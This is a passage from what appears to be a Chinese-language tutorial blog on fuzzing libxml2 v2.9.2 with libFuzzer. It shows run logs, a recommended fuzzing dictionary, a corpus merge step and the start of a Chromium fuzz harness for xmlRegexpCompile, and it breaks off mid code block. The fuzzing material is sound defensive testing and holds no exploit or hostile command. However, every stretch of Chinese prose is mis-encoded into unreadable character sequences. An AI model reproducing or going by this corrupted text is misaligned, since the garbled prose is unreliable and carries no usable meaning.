class="number">7806</span> rss: <span class="number">452</span>Mb L: <span class="number">74</span>/<span class="number">135</span> MS: <span class="number">1</span> InsertByte-</span><br><span class="line">#<span class="number">468390</span>REDUCE cov: <span class="number">2521</span> ft: <span class="number">8273</span> corp: <span class="number">2494</span>/<span class="number">82</span>Kb lim: <span class="number">135</span> exec/s: <span class="number">7806</span> rss: <span class="number">452</span>Mb L: <span class="number">66</span>/<span class="number">135</span> MS: <span class="number">2</span> ChangeASCIIInt-EraseBytes-</span><br><span class="line">#<span class="number">468391</span>REDUCE cov: <span class="number">2521</span> ft: <span class="number">8273</span> corp: <span class="number">2494</span>/<span class="number">82</span>Kb lim: <span class="number">135</span> exec/s: <span class="number">7806</span> rss: <span class="number">452</span>Mb L: <span class="number">89</span>/<span class="number">135</span> MS: <span class="number">1</span> EraseBytes-</span><br><span class="line">#<span class="number">468575</span>DONE   cov: <span class="number">2521</span> ft: <span class="number">8273</span> corp: <span class="number">2494</span>/<span class="number">82</span>Kb lim: <span class="number">135</span> exec/s: <span class="number">7681</span> rss: <span class="number">452</span>Mb</span><br><span class="line">###### Recommended dictionary. ######</span><br><span class="line"><span class="string">&quot;\x08\x00&quot;</span> # Uses: <span class="number">366</span></span><br><span class="line"><span class="string">&quot;Q\x00&quot;</span> # Uses: <span class="number">370</span></span><br><span class="line"><span class="string">&quot;\x00:&quot;</span> # Uses: <span class="number">325</span></span><br><span class="line"><span class="string">&quot;\x97\x00&quot;</span> # Uses: <span class="number">301</span></span><br><span class="line"><span class="string">&quot;\x0d\x00&quot;</span> # Uses: <span class="number">335</span></span><br><span class="line"><span class="string">&quot;\xfe\xff\xff\xff&quot;</span> # Uses: <span class="number">273</span></span><br><span class="line"><span class="string">&quot;UCS-&quot;</span> # Uses: <span class="number">294</span></span><br><span class="line"><span class="string">&quot;\x15\x00&quot;</span> # Uses: <span class="number">277</span></span><br><span class="line"><span class="string">&quot;\x00\x00&quot;</span> # Uses: <span class="number">289</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\x1c&quot;</span> # Uses: <span class="number">258</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff!&quot;</span> # Uses: <span class="number">257</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\x01&quot;</span> # Uses: <span class="number">250</span></span><br><span class="line"><span class="string">&quot;UTF-1&quot;</span> # Uses: <span class="number">250</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xffN&quot;</span> # Uses: <span class="number">236</span></span><br><span class="line"><span class="string">&quot;UTF-16LE&quot;</span> # Uses: <span class="number">223</span></span><br><span class="line"><span class="string">&quot;ISO-10&quot;</span> # Uses: <span class="number">228</span></span><br><span class="line"><span class="string">&quot;ISO-1064&quot;</span> # Uses: <span class="number">256</span></span><br><span class="line"><span class="string">&quot;\x0a\x00\x00\x00&quot;</span> # Uses: <span class="number">246</span></span><br><span class="line"><span class="string">&quot;Q\x00\x00\x00&quot;</span> # Uses: <span class="number">247</span></span><br><span class="line"><span class="string">&quot;\xf1\x1f\x00\x00\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">212</span></span><br><span class="line"><span class="string">&quot;$\x00\x00\x00\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">194</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\x0e&quot;</span> # Uses: <span class="number">211</span></span><br><span class="line"><span class="string">&quot;\x09\x00&quot;</span> # Uses: <span class="number">226</span></span><br><span class="line"><span class="string">&quot;\x01\x00\x00\xfa&quot;</span> # Uses: <span class="number">212</span></span><br><span class="line"><span class="string">&quot;\x01\x00\x00\x02&quot;</span> # Uses: <span class="number">239</span></span><br><span class="line"><span class="string">&quot;\xac\x0f\x00\x00\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">206</span></span><br><span class="line"><span class="string">&quot;\xffO&quot;</span> # Uses: <span class="number">263</span></span><br><span class="line"><span class="string">&quot;\xff\x03&quot;</span> # Uses: <span class="number">235</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\xff\xff\xff\xff\x10&quot;</span> # Uses: <span class="number">200</span></span><br><span class="line"><span class="string">&quot;\xf4\x01\x00\x00\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">203</span></span><br><span class="line"><span class="string">&quot;UTF-16BE&quot;</span> # Uses: <span class="number">188</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00P&quot;</span> # Uses: <span class="number">207</span></span><br><span class="line"><span class="string">&quot;\x0a\x00&quot;</span> # Uses: <span class="number">196</span></span><br><span class="line"><span class="string">&quot;\xff\xff&quot;</span> # Uses: <span class="number">203</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\xff\xff\x97\x96\x80&quot;</span> # Uses: <span class="number">186</span></span><br><span class="line"><span class="string">&quot;\x01 \x00\x00\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">187</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00$&quot;</span> # Uses: <span class="number">156</span></span><br><span class="line"><span class="string">&quot;P\x00&quot;</span> # Uses: <span class="number">186</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\xff&quot;</span> # Uses: <span class="number">197</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\x09&quot;</span> # Uses: <span class="number">202</span></span><br><span class="line"><span class="string">&quot;\x12\x00\x00\x00\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">204</span></span><br><span class="line"><span class="string">&quot;\x01\x01&quot;</span> # Uses: <span class="number">170</span></span><br><span class="line"><span class="string">&quot;\x01\x00\x00\x00\x00\x00\x00\x10&quot;</span> # Uses: <span class="number">197</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\xff\xff\xff\xff\x03&quot;</span> # Uses: <span class="number">183</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">174</span></span><br><span class="line"><span class="string">&quot;\xff\x05&quot;</span> # Uses: <span class="number">198</span></span><br><span class="line"><span class="string">&quot;US-ASCII&quot;</span> # Uses: <span class="number">214</span></span><br><span class="line"><span class="string">&quot;\x01\x00&quot;</span> # Uses: <span class="number">201</span></span><br><span class="line"><span class="string">&quot;xlmns&quot;</span> # Uses: <span class="number">189</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\x14&quot;</span> # Uses: <span class="number">191</span></span><br><span class="line"><span class="string">&quot;xmlsn&quot;</span> # Uses: <span class="number">179</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x03&quot;</span> # Uses: <span class="number">201</span></span><br><span class="line"><span class="string">&quot;xmlns&quot;</span> # Uses: <span class="number">182</span></span><br><span class="line"><span class="string">&quot;\xaf\x0f\x00\x00\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">186</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\xff\xff\xff\x0e\xb9&quot;</span> # Uses: <span class="number">176</span></span><br><span class="line"><span class="string">&quot;\xff\x09&quot;</span> # Uses: <span class="number">178</span></span><br><span class="line"><span class="string">&quot;ISO-1&quot;</span> # Uses: <span class="number">191</span></span><br><span class="line"><span class="string">&quot;la&quot;</span> # Uses: <span class="number">157</span></span><br><span class="line"><span class="string">&quot;\x01\x00\x00\x00&quot;</span> # Uses: <span class="number">173</span></span><br><span class="line"><span class="string">&quot;\x01\x00\x00\x00\x00\x00\x00\x14&quot;</span> # Uses: <span class="number">172</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\x7f\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">164</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x04&quot;</span> # Uses: <span class="number">154</span></span><br><span class="line"><span class="string">&quot;\x01\x00\x00\x00\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">153</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x02&quot;</span> # Uses: <span class="number">136</span></span><br><span class="line"><span class="string">&quot;\x04\x00\x00\x00\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">140</span></span><br><span class="line"><span class="string">&quot;ISO-10646-&quot;</span> # Uses: <span class="number">146</span></span><br><span class="line"><span class="string">&quot;id&quot;</span> # Uses: <span class="number">155</span></span><br><span class="line"><span class="string">&quot;\x00\x01&quot;</span> # Uses: <span class="number">145</span></span><br><span class="line"><span class="string">&quot;\x00\x02&quot;</span> # Uses: <span class="number">140</span></span><br><span class="line"><span class="string">&quot;\x01\x00\x00\x08&quot;</span> # Uses: <span class="number">165</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x1e&quot;</span> # Uses: <span class="number">136</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\xff~\xff\xff\xff&quot;</span> # Uses: <span class="number">130</span></span><br><span class="line"><span class="string">&quot;\x81\x96\x98\x00\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">150</span></span><br><span class="line"><span class="string">&quot;\x03\x00\x00\x00&quot;</span> # Uses: <span class="number">116</span></span><br><span class="line"><span class="string">&quot;\x18\x00\x00\x00&quot;</span> # Uses: <span class="number">176</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\xff\xff\xff\xff\xf9&quot;</span> # Uses: <span class="number">124</span></span><br><span class="line"><span class="string">&quot;%\x17\x8f[&quot;</span> # Uses: <span class="number">130</span></span><br><span class="line"><span class="string">&quot;\x0e\x00\x00\x00&quot;</span> # Uses: <span class="number">142</span></span><br><span class="line"><span class="string">&quot;\x01\x00\x00\x00\x00\x00\x00\xfa&quot;</span> # Uses: <span class="number">96</span></span><br><span class="line"><span class="string">&quot;\x06\x00\x00\x00\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">116</span></span><br><span class="line"><span class="string">&quot;\x00\x04&quot;</span> # Uses: <span class="number">161</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x0b&quot;</span> # Uses: <span class="number">119</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x06&quot;</span> # Uses: <span class="number">141</span></span><br><span class="line"><span class="string">&quot;annnn\xd4nnnnnn&quot;</span> # Uses: <span class="number">100</span></span><br><span class="line"><span class="string">&quot;\x1f\x00\x00\x00\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">106</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x17&quot;</span> # Uses: <span class="number">114</span></span><br><span class="line"><span class="string">&quot;\x16\x00\x00\x00\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">122</span></span><br><span class="line"><span class="string">&quot;\x0f\x00&quot;</span> # Uses: <span class="number">121</span></span><br><span class="line"><span class="string">&quot;inlc0a&quot;</span> # Uses: <span class="number">128</span></span><br><span class="line"><span class="string">&quot;\x01\x00\x00O&quot;</span> # Uses: <span class="number">101</span></span><br><span class="line"><span class="string">&quot;\x01\x04&quot;</span> # Uses: <span class="number">117</span></span><br><span class="line"><span class="string">&quot;\x01P&quot;</span> # Uses: <span class="number">122</span></span><br><span class="line"><span class="string">&quot;\xfb\x00\x00\x00\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">95</span></span><br><span class="line"><span class="string">&quot;\x03\x00\x00\x00\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">107</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x03&quot;</span> # Uses: <span class="number">98</span></span><br><span class="line"><span class="string">&quot;\x00#&quot;</span> # Uses: <span class="number">102</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x0d&quot;</span> # Uses: <span class="number">92</span></span><br><span class="line"><span class="string">&quot;ISO-8859-1&quot;</span> # Uses: <span class="number">100</span></span><br><span class="line"><span class="string">&quot;\xff\xf9&quot;</span> # Uses: <span class="number">77</span></span><br><span class="line"><span class="string">&quot;\xf7\x0f\x00\x00\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">79</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\xff\xff\xff\xff\xfb&quot;</span> # Uses: <span class="number">82</span></span><br><span class="line"><span class="string">&quot;\x01\x0b&quot;</span> # Uses: <span class="number">101</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\xff\xff\xff\x0e\xff&quot;</span> # Uses: <span class="number">78</span></span><br><span class="line"><span class="string">&quot;&gt;&lt;&gt;\xb7&quot;</span> # Uses: <span class="number">81</span></span><br><span class="line"><span class="string">&quot;&lt;b&quot;</span> # Uses: <span class="number">81</span></span><br><span class="line"><span class="string">&quot;UTF-8\x00&quot;</span> # Uses: <span class="number">76</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\xff\xff\xff\xff\x09&quot;</span> # Uses: <span class="number">63</span></span><br><span class="line"><span class="string">&quot;#\x00\x00\x00&quot;</span> # Uses: <span class="number">75</span></span><br><span class="line"><span class="string">&quot;S\x00\x00\x00\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">73</span></span><br><span class="line"><span class="string">&quot;a\xff&quot;</span> # Uses: <span class="number">70</span></span><br><span class="line"><span class="string">&quot;TIONb&quot;</span> # Uses: <span class="number">46</span></span><br><span class="line"><span class="string">&quot;\x01\x00\x00?&quot;</span> # Uses: <span class="number">69</span></span><br><span class="line"><span class="string">&quot;!\x00\x00\x00&quot;</span> # Uses: <span class="number">67</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x01&quot;</span> # Uses: <span class="number">74</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\xff\xff\xff\x1f\x02&quot;</span> # Uses: <span class="number">57</span></span><br><span class="line"><span class="string">&quot;\x01\x00\x00\x00\x00\x00\x00\x16&quot;</span> # Uses: <span class="number">57</span></span><br><span class="line"><span class="string">&quot;-\x00\x00\x00\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">53</span></span><br><span class="line"><span class="string">&quot;\x01\x00\x00\x05&quot;</span> # Uses: <span class="number">65</span></span><br><span class="line"><span class="string">&quot;:b&quot;</span> # Uses: <span class="number">67</span></span><br><span class="line"><span class="string">&quot;\x17\x1c_&gt;&quot;</span> # Uses: <span class="number">63</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\xff\xff\xff\xff\x18&quot;</span> # Uses: <span class="number">64</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00&#x27;&quot;</span> # Uses: <span class="number">45</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x05&quot;</span> # Uses: <span class="number">52</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\x0d&quot;</span> # Uses: <span class="number">51</span></span><br><span class="line"><span class="string">&quot;US-AS&quot;</span> # Uses: <span class="number">48</span></span><br><span class="line"><span class="string">&quot;a&gt;&quot;</span> # Uses: <span class="number">53</span></span><br><span class="line"><span class="string">&quot;C\x00\x00\x00\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">44</span></span><br><span class="line"><span class="string">&quot;\xff\xff\x00\x00&quot;</span> # Uses: <span class="number">36</span></span><br><span class="line"><span class="string">&quot;\x01\x07&quot;</span> # Uses: <span class="number">49</span></span><br><span class="line"><span class="string">&quot;@\x00\x00\x00&quot;</span> # Uses: <span class="number">46</span></span><br><span class="line"><span class="string">&quot;\x02\x00&quot;</span> # Uses: <span class="number">32</span></span><br><span class="line"><span class="string">&quot;+\x00&quot;</span> # Uses: <span class="number">37</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x00\x00\x00 \x02&quot;</span> # Uses: <span class="number">42</span></span><br><span class="line"><span class="string">&quot;\x00\x0f&quot;</span> # Uses: <span class="number">37</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\xff\xff\xff\xff$&quot;</span> # Uses: <span class="number">49</span></span><br><span class="line"><span class="string">&quot;ASCII&quot;</span> # Uses: <span class="number">40</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x00\x00\x00\x01\x00&quot;</span> # Uses: <span class="number">30</span></span><br><span class="line"><span class="string">&quot;a\xff:-\xec&quot;</span> # Uses: <span class="number">27</span></span><br><span class="line"><span class="string">&quot;\xff\x1a&quot;</span> # Uses: <span class="number">30</span></span><br><span class="line"><span class="string">&quot;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&amp;&#x27;&#x27;&quot;</span> # Uses: <span class="number">23</span></span><br><span class="line"><span class="string">&quot;\x01\x00\x00\x00\x00\x00\x01\x1d&quot;</span> # Uses: <span class="number">34</span></span><br><span class="line"><span class="string">&quot;TIOIb&quot;</span> # Uses: <span class="number">19</span></span><br><span class="line"><span class="string">&quot;J\x00\x00\x00\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">15</span></span><br><span class="line"><span class="string">&quot;N\x00\x00\x00&quot;</span> # Uses: <span class="number">10</span></span><br><span class="line"><span class="string">&quot;\x01O&quot;</span> # Uses: <span class="number">8</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\x02&quot;</span> # Uses: <span class="number">6</span></span><br><span class="line"><span class="string">&quot;HTML&quot;</span> # Uses: <span class="number">8</span></span><br><span class="line"><span class="string">&quot;\x00P&quot;</span> # Uses: <span class="number">9</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\x00&quot;</span> # Uses: <span class="number">9</span></span><br><span class="line"><span class="string">&quot;\xff\x06&quot;</span> # Uses: <span class="number">9</span></span><br><span class="line"><span class="string">&quot;\x7f\x96\x98\x00\x00\x00\x00\x00&quot;</span> # Uses: <span class="number">4</span></span><br><span class="line"><span class="string">&quot;^&gt;&lt;b&gt;&quot;</span> # Uses: <span class="number">5</span></span><br><span class="line"><span class="string">&quot;\x01\x0a&quot;</span> # Uses: <span class="number">5</span></span><br><span class="line"><span class="string">&quot;\x13\x00&quot;</span> # Uses: <span class="number">1</span></span><br><span class="line">###### End of recommended dictionary. ######</span><br><span class="line">Done <span class="number">479244</span> runs in <span class="number">61</span> second(s)</span><br><span class="line">stat::number_of_executed_units: <span class="number">479244</span></span><br><span class="line">stat::average_exec_per_sec:     <span class="number">7856</span></span><br><span class="line">stat::new_units_added:          <span class="number">5007</span></span><br><span class="line">stat::slowest_unit_time_sec:    <span class="number">0</span></span><br><span class="line">stat::peak_rss_mb:              <span class="number">467</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æœ€åè¿˜ç»™å‡ºäº†<code>Recommended dictionary</code>ï¼Œå¯ä»¥æ›´æ–°åˆ°æˆ‘ä»¬çš„.dictä¸­ã€‚<br><code>stat::new_units_added:          4709</code>è¯´æ˜æœ€ç»ˆæ¢æµ‹åˆ°äº†5007ä¸ªä»£ç å•å…ƒã€‚<br>ä¸ä½¿ç”¨å­—å…¸çš„è¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Done 402774 runs in 61 second(s)</span><br><span class="line">stat::number_of_executed_units: 402774</span><br><span class="line">stat::average_exec_per_sec:     6602</span><br><span class="line">stat::new_units_added:          3761</span><br><span class="line">stat::slowest_unit_time_sec:    0</span><br><span class="line">stat::peak_rss_mb:              453</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ä½¿ç”¨å­—å…¸æ•ˆç‡ç¡®å®æé«˜ä¸å°‘ã€‚</p><p>æ­¤å¤–ï¼Œå½“æˆ‘ä»¬é•¿æ—¶é—´fuzzæ—¶ï¼Œä¼šäº§ç”Ÿå’Œç¼–è¯‘å‡ºå¾ˆå¤šæ ·æœ¬ï¼Œè¿™äº›æ ·æœ¬å­˜æ”¾åœ¨è¯­æ–™åº“corpusä¸­ï¼Œä¾‹å¦‚ä¸Šé¢å°±äº§ç”Ÿäº†<code>âœ  08 git:(master) âœ— ls -lR| grep &quot;^-&quot; | wc -l 7217</code> 7217ä¸ªæ ·æœ¬ï¼Œå…¶ä¸­å¾ˆå¤šæ˜¯é‡å¤çš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹æ³•è¿›è¡Œç²¾ç®€(ä½¿ç”¨-merge&#x3D;1æ ‡å¿—)ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">mkdir corpus1_min</span><br><span class="line">corpus1_min: ç²¾ç®€åçš„æ ·æœ¬é›†å­˜æ”¾çš„ä½ç½®</span><br><span class="line">corpus1: åŸå§‹æ ·æœ¬é›†å­˜æ”¾çš„ä½ç½®</span><br><span class="line"></span><br><span class="line">âœ  <span class="number">08</span> git:(master) âœ— ./libxml2-v2<span class="number">.9</span><span class="number">.2</span>-fsanitize_fuzzer1 -merge=<span class="number">1</span> corpus1_min corpus1</span><br><span class="line">INFO: Seed: <span class="number">1264856731</span></span><br><span class="line">INFO: Loaded <span class="number">1</span> modules   (<span class="number">53343</span> inline <span class="number">8</span>-bit counters): <span class="number">53343</span> [<span class="number">0xd27740</span>, <span class="number">0xd3479f</span>), </span><br><span class="line">INFO: Loaded <span class="number">1</span> PC tables (<span class="number">53343</span> PCs): <span class="number">53343</span> [<span class="number">0x9b3650</span>,<span class="number">0xa83c40</span>), </span><br><span class="line">MERGE-OUTER: <span class="number">2724</span> files, <span class="number">0</span> in the initial corpus</span><br><span class="line">MERGE-OUTER: attempt <span class="number">1</span></span><br><span class="line">INFO: Seed: <span class="number">1264900516</span></span><br><span class="line">INFO: Loaded <span class="number">1</span> modules   (<span class="number">53343</span> inline <span class="number">8</span>-bit counters): <span class="number">53343</span> [<span class="number">0xd27740</span>, <span class="number">0xd3479f</span>), </span><br><span class="line">INFO: Loaded <span class="number">1</span> PC tables (<span class="number">53343</span> PCs): <span class="number">53343</span> [<span class="number">0x9b3650</span>,<span class="number">0xa83c40</span>), </span><br><span class="line">INFO: -max_len is not provided; libFuzzer will not generate inputs larger than <span class="number">1048576</span> bytes</span><br><span class="line">MERGE-INNER: using the control file <span class="string">&#x27;/tmp/libFuzzerTemp.8187.txt&#x27;</span></span><br><span class="line">MERGE-INNER: <span class="number">2724</span> total files; <span class="number">0</span> processed earlier; will process <span class="number">2724</span> files now</span><br><span class="line">#<span class="number">1</span>pulse  cov: <span class="number">464</span> exec/s: <span class="number">0</span> rss: <span class="number">32</span>Mb</span><br><span class="line">#<span class="number">2</span>pulse  cov: <span class="number">470</span> exec/s: <span class="number">0</span> rss: <span class="number">33</span>Mb</span><br><span class="line">#<span class="number">4</span>pulse  cov: <span class="number">502</span> exec/s: <span class="number">0</span> rss: <span class="number">33</span>Mb</span><br><span class="line">#<span class="number">8</span>pulse  cov: <span class="number">522</span> exec/s: <span class="number">0</span> rss: <span class="number">34</span>Mb</span><br><span class="line">#<span class="number">16</span>pulse  cov: <span class="number">533</span> exec/s: <span class="number">0</span> rss: <span class="number">34</span>Mb</span><br><span class="line">#<span class="number">32</span>pulse  cov: <span class="number">681</span> exec/s: <span class="number">0</span> rss: <span class="number">35</span>Mb</span><br><span class="line">#<span class="number">64</span>pulse  cov: <span class="number">756</span> exec/s: <span class="number">0</span> rss: <span class="number">36</span>Mb</span><br><span class="line">#<span class="number">128</span>pulse  cov: <span class="number">1077</span> exec/s: <span class="number">0</span> rss: <span class="number">39</span>Mb</span><br><span class="line">#<span class="number">256</span>pulse  cov: <span class="number">1247</span> exec/s: <span class="number">0</span> rss: <span class="number">45</span>Mb</span><br><span class="line">#<span class="number">512</span>pulse  cov: <span class="number">1553</span> exec/s: <span class="number">0</span> rss: <span class="number">55</span>Mb</span><br><span class="line">#<span class="number">1024</span>pulse  cov: <span class="number">2166</span> exec/s: <span class="number">0</span> rss: <span class="number">77</span>Mb</span><br><span class="line">#<span class="number">2048</span>pulse  cov: <span class="number">2550</span> exec/s: <span class="number">2048</span> rss: <span class="number">120</span>Mb</span><br><span class="line">#<span class="number">2724</span>DONE  cov: <span class="number">2666</span> exec/s: <span class="number">2724</span> rss: <span class="number">155</span>Mb</span><br><span class="line">MERGE-OUTER: succesfull in <span class="number">1</span> attempt(s)</span><br><span class="line">MERGE-OUTER: the control file has <span class="number">287194</span> bytes</span><br><span class="line">MERGE-OUTER: consumed <span class="number">0</span>Mb (<span class="number">38</span>Mb rss) to parse the control file</span><br><span class="line">MERGE-OUTER: <span class="number">2313</span> <span class="built_in">new</span> files with <span class="number">8750</span> <span class="built_in">new</span> features added; <span class="number">2666</span> <span class="built_in">new</span> coverage edges</span><br></pre></td></tr></table></figure><p>ç²¾ç®€åˆ°äº†2313ä¸ªæ ·æœ¬ã€‚</p><p>workshopè¿˜æä¾›äº†å¦ä¸€ä¸ªfuzz target:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">âœ  <span class="number">08</span> git:(master) âœ— cat xml_compile_regexp_fuzzer.cc </span><br><span class="line"><span class="comment">// Copyright 2016 The Chromium Authors. All rights reserved.</span></span><br><span class="line"><span class="comment">// Use of this source code is governed by a BSD-style license that can be</span></span><br><span class="line"><span class="comment">// found in the LICENSE file.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;libxml/parser.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;libxml/tree.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;libxml/xmlversion.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ignore</span> <span class="params">(<span class="type">void</span> * ctx, <span class="type">const</span> <span class="type">char</span> * msg, ...)</span> &#123;</span><br><span class="line">  <span class="comment">// Error handler to avoid spam of error messages from libxml parser.</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Entry point for LibFuzzer.</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">int</span> <span class="title function_">LLVMFuzzerTestOneInput</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *data, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">  xmlSetGenericErrorFunc(<span class="literal">NULL</span>, &amp;ignore);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">uint8_t</span>&gt; <span class="title function_">buffer</span><span class="params">(size + <span class="number">1</span>, <span class="number">0</span>)</span>;</span><br><span class="line">  <span class="built_in">std</span>::copy(data, data + size, buffer.data());</span><br><span class="line"></span><br><span class="line">  xmlRegexpPtr x = xmlRegexpCompile(buffer.data());</span><br><span class="line">  <span class="keyword">if</span> (x)</span><br><span class="line">    xmlRegFreeRegexp(x);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸ä¹‹å‰çš„ä¸åŒï¼Œå°†è¾“å…¥çš„æ•°æ®copyåˆ°bufferä¸­ï¼Œå†äº¤ç»™<code>xmlRegexpCompile</code>å¤„ç†ã€‚ç¼–è¯‘è¿è¡Œå¦‚ä¸‹:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 